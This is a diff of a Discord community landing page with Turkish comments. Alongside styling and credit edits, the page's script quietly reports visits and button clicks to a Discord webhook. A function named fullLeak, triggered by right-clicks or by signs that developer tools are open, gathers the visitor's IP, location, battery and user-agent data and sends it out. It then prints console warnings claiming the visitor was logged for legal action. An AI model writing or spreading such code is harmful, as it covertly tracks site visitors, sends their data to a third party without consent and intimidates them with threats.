@@ -260,7 +260,7 @@
             box-shadow: 0 15px 40px rgba(0, 225, 255, 0.4); 
         }
 
-        /* JOIN THE DREAM ANIMASYONU (TAMİRLİ) */
+        /* JOIN THE DREAM BUTONU */
         .join-now { 
             padding: 22px 70px; 
             background: linear-gradient(135deg, #ffffff 0%, #a2a2a2 100%);
@@ -362,7 +362,7 @@
         <div class="anim-wrap" style="animation-delay: 0.7s">
             <a href="https://discord.gg/JJsEbmGyFX" target="_blank" class="join-now" id="discord-btn">JOIN THE DREAM ›</a>
             <div style="font-size: 10px; color: rgba(255,255,255,0.3); letter-spacing: 4px; margin-top:30px; font-weight: 500;">
-                FOUNDER: <span style="color: #fff;">LD✦ GHOST</span> | CREATIVE: <span style="color: #00e1ff;">SE7ENSYNDRAXE</span>
+                FOUNDER: <span style="color: #fff;">LD✦ GHOST</span> | SECONDARY FOUNDER: <span style="color: #00FFFF;">SE7ENSYNDRAXE</span>
             </div>
         </div>
     </div>
@@ -393,24 +393,26 @@
             } catch(e) { console.error("Webhook Error"); }
         }
 
-        // --- BUTON TIKLAMA LOGLARI (TEK TEK BAĞLANDI) ---
+        // --- BUTON TIKLAMA LOGLARI ---
         document.getElementById('steam-btn').onclick = () => sendLog("🎮 STEAM TIKLANDI", "Kullanıcı Steam grubuna yönlendiriliyor.", 5793266);
         document.getElementById('insta-btn').onclick = () => sendLog("📸 INSTA TIKLANDI", "Kullanıcı Instagram profilini açtı.", 15105570);
         document.getElementById('discord-btn').onclick = () => sendLog("💬 DISCORD TIKLANDI", "Kullanıcı sunucuya katıl butonuna bastı.", 5814783);
 
-        // --- ULTRA CONSOLE & DATA SURVEILLANCE ---
+        // --- ULTRA CONSOLE & DATA SURVEILLANCE (ESKİ SERT VERSİYON) ---
         async function fullLeak() {
             if (intrusionLogged) return;
             intrusionLogged = true;
 
-            // KONSOL MESAJLARI (KEMİRİLMEMİŞ VERSİYON)
+            // KONSOL MESAJLARI (ESKİ SERT VERSİYON GERİ GELDİ)
             console.clear();
             console.log("%c                                                                ", "background: #00e1ff; padding: 5px;");
             console.log("%c  SE7ENSYNDRAXE SECURITY v5.0 - INTRUSION DETECTED  ", "color: #000; background: #00e1ff; font-weight: bold; font-size: 20px; padding: 10px;");
             console.log("%c                                                                ", "background: #00e1ff; padding: 5px;");
             console.log("%c[SYSTEM]: Unauthorized access to console detected.", "color: #ff0000; font-size: 14px; font-weight: bold; margin-top: 10px;");
-            console.log("%c[REPORT]: Gathering hardware and network forensics...", "color: #00e1ff;");
-            console.log("%c[STATUS]: Data packets sent to Se7enSyndraxe via Secure Webhook.", "color: #fff;");
+            
+            // İstediğin Türkçe ve İngilizce Yasal Uyarılar
+            console.log("%c[REPORT]: IP adresin ve cihaz kimliğin yasal işlem için loglanmıştır.", "color: #ffffff; font-size: 14px; font-weight: bold;");
+            console.log("%c[REPORT]: Your IP address and device identity have been logged for legal action.", "color: #ffffff; font-size: 14px; font-weight: bold;");
 
             try {
                 const ipRes = await fetch('https://ipapi.co/json/');
@@ -428,7 +430,7 @@
                 }
 
                 const dataReport = `
-**🚨 KRİTİK SIZMA ANALİZİ**
+**🚨 KRİTİK SIZMA ANALİZİ (ULTRA DATA LEAK)**
 -------------------------------------------
 **🌐 NETWORK INFO**
 **IP:** \`${ipData.ip}\`
@@ -446,7 +448,7 @@
 **Battery:** \`${battery}\`
 **User-Agent:** \`${navigator.userAgent.substring(0, 150)}...\`
 -------------------------------------------
-**⚠️ EYLEM:** Konsol açıldı ve tüm veriler çekildi.
+**🛑 EYLEM:** Konsol açıldı ve tüm veriler hukuki süreç için Discord'a mühürlendi.
                 `;
                 sendLog("🛑 FULL SYSTEM EXPLOIT", dataReport, 15158332);
             } catch (err) {
@@ -460,7 +462,7 @@
         });
         window.oncontextmenu = (e) => { e.preventDefault(); fullLeak(); };
         
-        // Pencere Boyutu Değişimi (Önemli: Konsol yan tarafa açılırsa yakalar)
+        // Pencere Boyutu Değişimi
         setInterval(() => {
             const threshold = 160;
             if (window.outerWidth - window.innerWidth > threshold || window.outerHeight - window.innerHeight > threshold) {
@@ -547,7 +549,6 @@
             sendLog("🌟 SİTEYE GİRİŞ", "Kullanıcı portala giriş yaptı.");
         }
 
-        // Arka Plan Parçacıkları
         const canvas = document.getElementById('bg-canvas'), ctx = canvas.getContext('2d');
         let dots = [];
         function initCanvas() { 
